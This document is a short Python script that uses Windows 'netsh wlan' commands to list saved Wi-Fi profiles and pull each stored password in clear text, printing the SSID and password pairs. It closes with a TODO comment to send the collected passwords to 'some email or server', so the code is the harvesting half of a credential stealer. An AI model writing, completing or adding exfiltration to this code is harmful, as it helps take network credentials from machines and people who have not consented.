# Inorder to use system commands
import subprocess
import re

show_cmd = ["netsh", "wlan", "show"]

re_pattern_allUser = r"All User Profiles\s*:\s(.*)\r"
re_pattern_passwordExistence = r"Security Key\s*:\sAbsent"
re_pattern_password = r"Key Content\s*:\s(.*)\r"

# child process runs our system commands
# prevent output to go to default output stream & store in stdout
# decode for = get in unicode instead of byte

# Equ = netsh wlan show profiles
show_profiles_output = subprocess.run(
    [*show_cmd, "profiles"], capture_output=True
).stdout.decode()

wifi_profile_names = re.findall(re_pattern_allUser, show_profiles_output)

wifi_list = []

if wifi_profile_names:
    for name in wifi_profile_names:
        wifi_profile = {}
        # Equ = netsh wlan show profile prof_name
        profile_info = subprocess.run(
            [*show_cmd, "profile", name], capture_output=True
        ).stdout.decode()

        # Check if password exists or not
        if re.search(re_pattern_passwordExistence, profile_info):
            continue
        else:
            # ssid
            wifi_profile["ssid"] = name
            # Equ = netsh wlan show profile prof_name key=clear
            wifi_profile_pass_info = subprocess.run(
                [*show_cmd, "profile", name, "key=clear"], capture_output=True
            ).stdout.decode()

            # look for password in password info...
            wifi_password = re.search(re_pattern_password, wifi_profile_pass_info)

            if wifi_password is None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = wifi_password[1]

            wifi_list.append(wifi_profile)

    for wifi in wifi_list:
        print(wifi)

    # TODO : pass this wifi passwords to some email or server
